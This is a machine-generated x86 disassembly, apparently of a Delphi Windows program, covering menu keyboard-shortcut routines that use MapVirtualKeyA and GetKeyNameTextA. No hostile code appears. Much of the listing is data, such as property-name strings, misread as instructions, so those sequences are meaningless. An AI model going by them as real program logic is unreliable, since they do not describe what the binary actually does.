jne r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
outsb
push edx
jne r-xdata
add [ ebx ] bh
add [ eax ] al
call [ ebx + ebp ]
inc ebp
add [ ecx ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
je r-xdata
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
cmp ch ah
inc esp
add [ eax ] bh
pop edi
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
popa
outsd
cmp [ eax ] al
add bh bh
sbb [ fs : ebp ] eax
call sub_452c1d
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
movsb [ edi ] fs : [ esi ]

imul esi [ ebp + ebp * 2 + 0x61 ] 0x44e1b870
add [ eax ] cl
add bh bh
in al 0x18
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
outsd
outsb
jne r-xdata
imul esp esp 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push esp
sbb [ ebp ] al
enter 0x4521 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc ebx
popad
jo r-xdata
popad
jns r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pushad
inc ecx
add [ edx + ebx + 0x45 ] dh
add [ eax ] dl
pop ds
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
js r-xdata
je r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
push [ eax ]
sbb al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
add bh bh
hlt
movsb [ edi ] [ esi ]
jecxz r-xdata
mov [ edx ] ah
inc ebp
add [ eax ] al
in al 0x10
inc eax
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
[ eax ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
mov eax 0x8004519
and al [ ebp ]
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
cmp eax 0x58ff0000
and [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x6c6d6574
dec ecx
outsb
js r-xdata
jne r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
lodsb [ esi ]
sbb eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
inc edx
add [ eax + eax ] bh
add bh bh
nop
sub al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
add [ ebx ] cl
dec eax
insb
jo r-xdata
dec esp
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
dec [ eax + 0x22 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ ecx + ebx + 0x45 ]
outsb
test ch dh
inc ecx
add al ch
push ds
inc ebp
add [ eax + 0x100451f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
call esp
sbb al [ ebp ]
test al 0x22
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x84656c62
dec esp
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
dec eax
and al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bh
add [ eax ] al
add eax [ eax ]
std
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + esi + 0x36580045 ] bh
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x2d940040 ] bl
xor eax 0xd15c0040
inc ecx
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
outsd
dec ecx
je r-xdata
add [ edx - 0x41ffbb17 ] ch
jmp 0x9ce97a
je r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
dec esp
inc ecx
add [ eax ] ah
add bh bh
rcr [ edx ] 0x45
add [ eax + 0x4522 ] cl
insd
insb
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
xchg esp eax
sub eax 0x7bf80045
inc ecx
jae r-xdata
insd
xor al 0xe3
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
clc
sub al 0x45
add [ ebp + esi + 0x2de80045 ] ah
inc ebp
add ah dl
xor eax 0xe0045
add [ eax ] al
add [ eax ] al
add [ eax ] eax
jb r-xdata
cwde
jmp 0xffffffffea0ce966
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
mov esp 0x980044e2
add [ eax ] al
[ eax + 0x1ff0000 ]
inc ebp
add al bh
dec ecx
je r-xdata
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
insd
lea eax [ eax ]
pop esp
jmp r-xdata
inc ebp
add al bh
jpo r-xdata
sub_44ea1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + esi + 0x36580045 ] bh
inc ebp
add al bh
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
clc
sub al 0x45
add [ ebp + esi + 0x3b940045 ] ah
inc ebp
add al bl
cmp al [ ebp ]
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x8b756e65
add [ eax ] al
mov edx gs
inc esp
add [ eax ] ah
add [ eax ] al
adc cl ch
inc esp
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x2d940040 ] bl
inc ebp
add al bh
jpo r-xdata
rcr [ edx + ebp * 8 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x50756e65
0xe9c40044 0x44
sub_44eb13
mov eax 0x100453a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
adc al 0x3a
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
cmp al 0x4b
inc ecx
add [ eax ] dh
add [ eax ] al
inc [ eax ]
cmp al [ ebp ]
clc
xor al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa465646f

in al dx
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
jmp r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
loope r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
call [ edx + edi ]
in al dx
inc esp
outsd
sub ah ch
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push 0x74754274
jo r-xdata
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
call 0x34530d4
andps xmm2 [ eax + 0x6f ]
jo r-xdata
or dl [ eax + edx * 2 + 0x6f ]
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + esi + 0x36580045 ] bh
inc ebp
add al bh
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
jl r-xdata
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
push 0x30044ec
jo r-xdata
add [ eax - 0x57ffbac6 ] bl
cmp al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add ah ah
jmp r-xdata
jo r-xdata
inc ebp
add [ ebp + esi + 0x2de80045 ] ah
inc ebp
add ah dl
xor eax 0x44240045
inc ebp
add ah bl
inc esp
inc ebp
add [ edx ] cl
push esp
push eax
outsd
add [ edx + esi + 0x43f00040 ] bl
inc ebp
add al bh
jpo r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13 ] bh
inc esp
add [ eax ] bh
add [ eax ] al
adc cl ch
inc esp
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
outsd
shr ah 0x1
je r-xdata
jne r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ eax + 0x3a ] bh
inc ebp
add [ eax + 0x100453a ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jns r-xdata
jae r-xdata
add eax 0x756e654d
add [ eax ] bh
xor eax 0x32800040
inc eax
inc eax
outsd
insd
popad
push esp
outsd
je r-xdata
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ebp * 8 ] ah
inc esp
add [ 0x69526274 ] cl
push 0x74754274
inc esp
in al dx
andps xmm1 [ ebp + 0x65 ]
outsb
in al dx
inc esp
add [ ebx ] al
add [ ebp + esi + 0x40 ] al
xor eax 0xd15c0040
add [ ebp - 0x12cbffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ esp + ebp * 8 + 0x44 ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44ed ] cl
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
dec esp
inc ecx
add [ eax ] bh
inc esp
inc ebp
add [ eax + 0x44 ] al
dec eax
outsd
je r-xdata
inc ecx
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
mov ch ch
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ ecx + eax * 2 ] cl
cmp [ ebp + eax * 2 ] al
inc eax
inc esp
in al dx
jecxz r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
loopne r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
push cs
push eax
popad
jb r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ecx
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
call [ edx + edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
movsb [ edi ] [ esi ]

or ecx [ eax + 0x65 ]
insb
dec ebx
inc ecx
add [ eax ] dh
add [ eax ] al
inc [ eax ]
cmp al [ ebp ]
clc
xor al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
in al dx
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
je r-xdata
inc ebx
push 0x65676e61
test [ ecx + eax * 2 ] cl
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
je r-xdata
in eax dx
inc esp
add ah al
jmp 0x54ede2
je r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x73f40040 ] bl
inc ecx
add [ eax - 0x7fffbe8b ] bl
ja r-xdata
rcr al 0xef
add bh bh
jo r-xdata
hlt
add [ eax + 0x74 ] cl
inc ecx
add ah al
je r-xdata
add [ eax ] cl
push edx
outsb
clc
loope r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
in al dx
jecxz r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
cmp al 0x35
add ah dh
cmp eax 0x540a0045
push eax
outsd
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
out dx eax
inc esp
add [ eax + eax ] dl
add [ eax ] al
or [ edx + 0x41 ] dl
fsubr st7
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsb
push edx
jne r-xdata
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43e528
mov ebx eax
add [ ebp + edi * 2 + 0x42 ] ah
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
or [ eax ] al
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443d84
mov esi eax
test esi esi
jne r-xdata
test ebx ebx
je r-xdata
je r-xdata
inc edx
add [ eax + 0x7800427d ] bl
jge r-xdata
xor al 0x7d
imul esi [ ebx + 0x74 ] 0x44f04490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x10 ] dl
inc esp
add [ eax ] cl
add [ eax ] al
add ah dh
jpo r-xdata
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
outsd
mov esi ebx
retn
insd
push ebx
je r-xdata
add [ eax ] al
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7d340040 ] bl
add [ eax ] dh
xor eax 0x353c0040
arpl [ ebx - 0x70 ] bp
sub_44f090
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43e528
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443d84
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44f0e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44f120
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404038
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4042a8
sub_44f174
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44f35d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404220
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040d0
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404220
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404220
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404038
mov eax esi
call sub_404038
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040d0
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4081d4
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404344
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44f120
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404300
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f364
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
sub_44f378
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042f8
push eax
mov eax edi
call sub_4042f8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042f8
push eax
mov eax edi
call sub_4044f8
push eax
mov eax [ esi ]
call sub_4044f8
pop edx
pop ecx
call sub_4080b4
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042f8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404598
sub_44f3d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_44f4af
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44f378
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f378
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f378
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f378
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4b6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f174
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408064
test eax eax
jne r-xdata
sub_44f4ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_451a8c
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_451a9c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44f54c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_451a8c
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_451a8c
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_451a9c
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_451a9c
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44f4ec
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44f4ec
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_451a9c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_451a9c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44f698
push ebx
mov ebx eax
mov eax ebx
call sub_44c240
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
